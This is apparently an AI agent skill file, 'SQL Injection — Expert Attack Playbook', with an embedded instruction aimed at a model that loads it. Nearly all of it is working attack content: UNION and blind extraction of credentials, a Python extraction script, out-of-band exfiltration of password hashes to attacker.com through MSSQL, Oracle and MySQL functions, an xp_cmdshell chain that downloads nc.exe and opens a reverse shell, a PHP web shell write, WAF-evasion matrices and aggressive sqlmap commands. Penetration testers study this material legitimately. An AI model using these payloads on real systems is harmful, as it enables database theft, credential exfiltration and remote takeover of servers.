---
name: sqli-sql-injection
description: SQL injection — detection (error/boolean/time-based), UNION extraction, blind SQLi automation, out-of-band exfiltration (DNS/HTTP/SMB/LDAP), OS escalation (xp_cmdshell/UDF/Java), second-order injection, parameterized query bypass scenarios, WAF/filter evasion matrix, DB metadata extraction, and sqlmap advanced usage across MySQL/MSSQL/Oracle/PostgreSQL.
sources:
  - hack-skills/skills/sqli-sql-injection
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: SQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: SQL injection encompasses error-based, boolean-blind, time-based blind, UNION-based, stacked query, and out-of-band techniques. Each database engine has different syntax. This skill provides complete DB-specific payloads, OOB exfiltration, OS escalation, and sqlmap advanced usage. Base models often miss second-order SQLi, DNS/HTTP out-of-band exfiltration, parameterized query bypass scenarios, and DB-specific file read/write for RCE.

## 0. RELATED ROUTING

- [nosql-injection](../nosql-injection/SKILL.md) — MongoDB/Redis/CouchDB injection patterns
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) — escalate from xp_cmdshell/UDF to full RCE chain
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — SQLi → file read (MySQL LOAD_FILE, MSSQL bulk insert)
- [rce](../rce/SKILL.md) — JNDI/UDF/COPY FROM PROGRAM RCE chains

---

## 1. QUICK START — FIRST-PASS PAYLOADS

### Payload families by situation

| Situation | Start With | Why |
|---|---|---|
| Login or boolean branch | `' or 1=1--` | Fast signal on auth or conditional checks |
| Numeric parameter | `1 or 1=1` | Avoid quote dependency |
| ORDER BY / sorting | `1,2,3` then `1 desc--` | Good for structural probing |
| Visible SQL errors | `'` then DBMS-specific error probes | Error text gives DBMS clues |
| No visible output | time-based payloads | Stable fallback for blind targets |
| Heavy filtering / WAF | polyglot or whitespace-free variants | Expands parser confusion surface |

### Small, stable first-pass set

```text
'
' or 1=1--
' or '1'='1'--
1 or 1=1
') or ('1'='1
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'||(SELECT pg_sleep(5))--
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
' order by 1--
' union select null--
```

### DBMS routing hints

| Clue | Likely DBMS | Good Next Move |
|---|---|---|
| `You have an error in your SQL syntax` | MySQL | try `SLEEP()` and `@@version` |
| `Microsoft OLE DB Provider` | MSSQL | try `WAITFOR DELAY` |
| `PG::` / `PostgreSQL` | PostgreSQL | try `pg_sleep()` |
| `ORA-` prefix | Oracle | pivot to out-of-band or XML features |
| SQLite errors, local apps | SQLite | focus on boolean/UNION and file-backed behavior |

---

## 2. DETECTION — SUBTLE INDICATORS

Most SQLi is found by **behavioral differences**, not errors:

| Signal | Meaning |
|---|---|
| Page loads differently with `'` vs `''` | String context injection point |
| Numeric: `1` vs `1-1` vs `2-1` returns same | Arithmetic evaluated |
| `1=1` vs `1=2` in condition changes result | Boolean-based injection |
| SELECT with ORDER BY N: column count enumeration | UNION prep |
| Time delay: `'; WAITFOR DELAY '0:0:5'--` | Blind/time-based |
| 500 error on `'`, 200 on `''` | Unhandled exception = SQLi |
| Different HTTP response size | Boolean blind indicator |

**Critical**: test in ALL parameter types — URL query, POST body, JSON fields, XML values, HTTP headers (X-Forwarded-For, User-Agent, Referer, Cookie values).

### Error-Based Signatures

```sql
-- MySQL: "You have an error in your SQL syntax"
-- MSSQL: "Incorrect syntax near"
-- Oracle: "ORA-00933: SQL command not properly ended"
-- PostgreSQL: "unterminated quoted string at or near"
-- SQLite: "unrecognized token"
```

### Time-Based Blind

```sql
-- MySQL:
id=1 AND SLEEP(5)--

-- MSSQL:
id=1; WAITFOR DELAY '0:0:5'--

-- Oracle:
id=1 AND 1=(SELECT 1 FROM dual WHERE dbms_pipe.receive_message(('a'),5)=1)

-- PostgreSQL:
id=1; SELECT pg_sleep(5)--

-- SQLite:
id=1 AND RANDOMBLOB(100000000)
```

---

## 3. DATABASE FINGERPRINTING

```sql
-- MySQL
VERSION()              -- returns version string
@@datadir              -- data directory
@@global.secure_file_priv  -- file read restriction

-- MSSQL
@@VERSION              -- includes "Microsoft SQL Server"
DB_NAME()              -- current database
USER_NAME()            -- current user

-- Oracle
v$version              -- SELECT banner FROM v$version WHERE ROWNUM=1
sys.database_name      -- current db
user                   -- current Oracle user

-- PostgreSQL
version()              -- returns version
current_database()     -- current db
current_user           -- current user
```

---

## 4. UNION-BASED DATA EXTRACTION

### Step 1: Find Column Count

```sql
-- Method 1: ORDER BY
id=1 ORDER BY 1--      -- No error
id=1 ORDER BY 2--      -- No error
id=1 ORDER BY 3--      -- Error → 2 columns

-- Method 2: UNION NULL
id=1 UNION SELECT NULL--
id=1 UNION SELECT NULL,NULL--
id=1 UNION SELECT NULL,NULL,NULL-- -- No error → 3 columns
```

### Step 2: Find Displayable Columns

```sql
-- MySQL/MSSQL:
id=1 UNION SELECT 'a',NULL,NULL--
id=1 UNION SELECT NULL,'a',NULL--  -- if 'a' appears: column 2 is string

-- Oracle:
id=1 UNION SELECT 'a' FROM dual--
```

### Step 3: Extract Data

```sql
-- MySQL:
id=0 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
id=0 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
id=0 UNION SELECT 1,CONCAT(username,':',password),3 FROM users--

-- Oracle:
id=0 UNION SELECT NULL,table_name,NULL FROM all_tables--
id=0 UNION SELECT NULL,LISTAGG(column_name,','),NULL FROM all_tab_columns WHERE table_name='USERS'--

-- MSSQL:
id=0 UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--
id=0 UNION SELECT NULL,COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--

-- PostgreSQL:
id=0 UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
id=0 UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--
```

### Database-specific string concat

```sql
-- MySQL:    CONCAT(username,0x3a,password)
-- MSSQL:    username+'|'+password
-- Oracle:   username||'|'||password
-- PostgreSQL: username||':'||password
```

---

## 5. BLIND DATA EXTRACTION

### Boolean-Based Substring

```sql
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>96--

-- Oracle:
' AND SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a'--

-- MSSQL:
' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'--
```

### Python Automated Extraction

```python
import requests

def extract_data(url, query, charset="abcdefghijklmnopqrstuvwxyz0123456789@._-{}"):
    result = ""
    pos = 1
    while True:
        found = False
        for char in charset:
            payload = f"1 AND SUBSTRING(({query}),{pos},1)='{char}'"
            resp = requests.get(url, params={"id": payload})
            if "Welcome" in resp.text:  # True condition marker
                result += char
                found = True
                break
        if not found:
            break
        pos += 1
    return result

# Usage:
# extract_data("https://target.com/item", "SELECT password FROM users WHERE username='admin'")
```

---

## 6. OUT-OF-BAND (OOB) EXFILTRATION — CRITICAL

Use when blind injection has no time/boolean indicator, or batch queries can't return data inline.

### MSSQL — OpenRowSet (requires SQLOLEDB, outbound TCP)

```sql
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) SELECT TOP 1 username+':'+password FROM users--
```
Use **port 80 or 443** to bypass firewall egress restrictions.

### MSSQL — xp_dirtree DNS

```sql
'; DECLARE @q varchar(1024);
SET @q='\\'+SUBSTRING((SELECT password FROM users WHERE username='admin'),1,30)+'.attacker.com\a';
EXEC master..xp_dirtree @q--
```

### Oracle — UTL_HTTP (HTTP GET with data in URL path)

```sql
'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```
Oracle's UTL_HTTP supports proxy — can exfil through corporate proxy.

### Oracle — UTL_INADDR (DNS exfiltration — often bypasses HTTP restrictions)

```sql
'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```
Attacker sees: `HASH_VALUE.attacker.com` DNS query → read password hash.

### Oracle — DBMS_LDAP

```sql
SELECT DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com',389) FROM dual
```

### MySQL — DNS via LOAD_FILE (Windows + UNC path)

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT hex(password) FROM users LIMIT 1), '.attacker.com\\a'))
-- Triggers DNS lookup before connection attempt
-- Works on Windows hosts with outbound SMB
```

### MySQL — INTO OUTFILE (write PHP shell)

```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
-- Requirements: FILE privilege, writable web root, secure_file_priv=''
```

Use **Burp Collaborator or interactsh** to capture DNS/HTTP callbacks.

---

## 7. ESCALATION — OS COMMAND EXECUTION

### MSSQL — xp_cmdshell

```sql
'; EXEC xp_cmdshell('whoami')--

-- Enable if disabled (requires sysadmin):
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

-- Full RCE chain: download and exec reverse shell
'; EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/nc.exe C:\nc.exe'; --
'; EXEC xp_cmdshell 'C:\nc.exe -e cmd.exe attacker.com 4444'; --

-- COM automation alternative:
DECLARE @o INT
EXEC sp_OACreate 'wscript.shell', @o OUT
EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami > C:\out.txt'
```

### MySQL — UDF (User Defined Functions)

Write malicious shared library to filesystem, then `CREATE FUNCTION ... SONAME`.

### Oracle — Java Stored Procedures

```sql
EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
-- Then exec OS commands via Java Runtime
```

### PostgreSQL — COPY FROM PROGRAM (RCE)

```sql
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; --
'; COPY users TO '/tmp/users.csv'; --
```

---

## 8. SECOND-ORDER INJECTION

**Concept**: User input is stored safely (parameterized), but later **retrieved as trusted data** and concatenated into a new query without re-sanitization.

**Example attack flow**:
1. Register username: `admin'--`
2. Application safely inserts this into users table
3. Password change function fetches username from session and builds:
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. Comment strips the condition → updates **admin's** password

**Testing**: Inject in registration/profile fields, then trigger the data to be reused in another DB query. Review: password change, profile update, admin action on user data.

---

## 9. PARAMETERIZED QUERY BYPASS SCENARIOS

Parameterized queries do NOT prevent SQLi when:

1. **Table/column names are user-controlled** — params can't parameterize identifiers:
   ```sql
   "SELECT * FROM " + tableName + " WHERE id = ?"
   ```

2. **Partial parameterization** — some fields concatenated, others parameterized:
   ```sql
   "SELECT * FROM users WHERE type='" + userType + "' AND id=?"
   ```

3. **IN clause** with dynamic count (common ORM mistake):
   ```sql
   SELECT * FROM items WHERE id IN (1, 2, ?)  -- only last is parameterized
   ```

4. **Second-order** — data retrieved from DB assumed clean, re-used in query without params.

5. **PDO emulated prepares**: `PDO::ATTR_EMULATE_PREPARES=true` allows stacked queries even with parameterized-looking code.

---

## 10. DATABASE METADATA EXTRACTION

### MySQL

```sql
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
-- Bypass information_schema filter:
SELECT table_name FROM mysql.innodb_table_stats
```

### MSSQL

```sql
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'  -- user tables
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
```

### Oracle

```sql
SELECT owner,table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT username,password FROM dba_users  -- requires DBA
```

### PostgreSQL

```sql
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## 11. FILTER EVASION TECHNIQUES

### Comment Injection (break keywords)

```sql
SEL/**/ECT
UN/**/ION
1 UN/**/ION ALL SEL/**/ECT NULL--
-- MySQL versioned comments:
id=1/*!UNION*//*!SELECT*/1,2,3--
```

### Case Variation

```sql
UnIoN SeLeCt
uNiOn sElEcT 1,2,3--
```

### URL / Double Encoding

```sql
%55NION  -- U → UNION
%53ELECT -- S → SELECT
%2520UNION%2520SELECT  -- double encoded
```

### Whitespace Alternatives

```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- tab
SELECT%0ausername%0aFROM%0ausers  -- newline
SELECT(username)FROM(users)        -- parentheses as space
id=1+UNION+SELECT+1,2,3--         -- plus sign
```

### String Construction (bypass literal-string detection)

```sql
-- MySQL:   CHAR(117,115,101,114,110,97,109,101)
-- Oracle:  CHR(117)||CHR(115)||CHR(101)||CHR(114)
-- MSSQL:   CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)
```

### No-Comma Bypass

```sql
-- SUBSTRING alternative:
SUBSTRING('abc' FROM 1 FOR 1)
-- LIMIT alternative:
LIMIT 1 OFFSET 0
-- UNION with JOIN:
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
```

---

## 12. WAF BYPASS MATRIX

| Technique | Blocked | Bypass |
|---|---|---|
| Space filtered | `SELECT * FROM` | `SELECT/**/*//**/FROM`, `SELECT%0a*%0aFROM` |
| Comma filtered | `UNION SELECT 1,2,3` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` |
| Quote filtered | `'admin'` | `0x61646D696E` (hex), `CHAR(97,100,109,105,110)` |
| OR/AND filtered | `OR 1=1` | `\|\|1=1`, `&&1=1` |
| = filtered | `id=1` | `id LIKE 1`, `id REGEXP '^1$'`, `id IN (1)`, `id BETWEEN 1 AND 1` |
| SELECT filtered | | Use `handler` (MySQL), `PREPARE`+hex, or stacked queries |
| information_schema filtered | | `mysql.innodb_table_stats`, `sys.schema_table_statistics` |
| Keywords double-stripped | `UNION` | `UNUNIONION`, `SELSELECTECT` |

### Polyglot Injection

```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Unicode Entry Points

```
U+02BA ʺ (modifier letter double prime) → "
U+02B9 ʹ (modifier letter prime) → '
%%2727 → %27 → '
```

---

## 13. SQLMAP ADVANCED USAGE

```bash
# Basic scan:
sqlmap -u "https://target.com/item?id=1" --dbs

# POST parameter:
sqlmap -u "https://target.com/login" --data="user=test&pass=test" -p user --dbs

# Cookie injection:
sqlmap -u "https://target.com/item" --cookie="session=abc123; id=1" -p id --dbs

# Custom header injection:
sqlmap -u "https://target.com/" -H "X-Custom: *" --dbs

# Dump specific table:
sqlmap -u "https://target.com/item?id=1" -D database -T users --dump

# Bypass WAF (tamper scripts):
sqlmap -u "https://target.com/item?id=1" --tamper=space2comment,uppercase --dbs

# Common tamper scripts:
# space2comment.py     → replaces spaces with /**/
# uppercase.py         → random case mutations
# between.py           → replaces > with BETWEEN
# randomcase.py        → random case
# charencode.py        → URL-encodes characters
# modsecurityversioning.py → adds HTTP version for ModSecurity bypass

# OS shell (requires write permissions + OS command execution):
sqlmap -u "https://target.com/item?id=1" --os-shell

# SQL shell:
sqlmap -u "https://target.com/item?id=1" --sql-shell

# Level and risk (more aggressive):
sqlmap -u "https://target.com/item?id=1" --level=5 --risk=3 --dbs

# Time-based blind only:
sqlmap -u "https://target.com/item?id=1" --technique=T --dbs

# Proxy through Burp:
sqlmap -u "https://target.com/item?id=1" --proxy=http://127.0.0.1:8080 --dbs
```

---

## 14. TESTING CHECKLIST

```
□ Test ALL parameter types: GET, POST, JSON body, cookies, headers (User-Agent/Referer/X-Forwarded-For)
□ Boolean test: AND 1=1 vs AND 1=2 — different responses?
□ Error-based: single quote ' — SQL error message?
□ Time-based: SLEEP(5) / WAITFOR DELAY — 5-second delay?
□ UNION: determine column count with ORDER BY
□ Check for stacked queries via ; (MSSQL, PostgreSQL usually allow this)
□ Check second-order: inject in profile fields, see if reused elsewhere
□ For authenticated SQLi: try more aggressive sqlmap with --cookie
□ WAF present: try tamper scripts + manual obfuscation + no-comma bypass
□ MSSQL: test xp_cmdshell for RCE; use OpenRowSet/xp_dirtree for OOB
□ MySQL: test LOAD_FILE and INTO OUTFILE; DNS via UNC path on Windows
□ PostgreSQL: test COPY FROM PROGRAM for RCE
□ Oracle: test UTL_HTTP / UTL_INADDR / DBMS_LDAP for OOB exfil
□ Use Burp Collaborator/interactsh for OOB DNS/HTTP callbacks
□ Test parameterized bypass scenarios: table/column name injection, IN clause, PDO emulated prepares
```
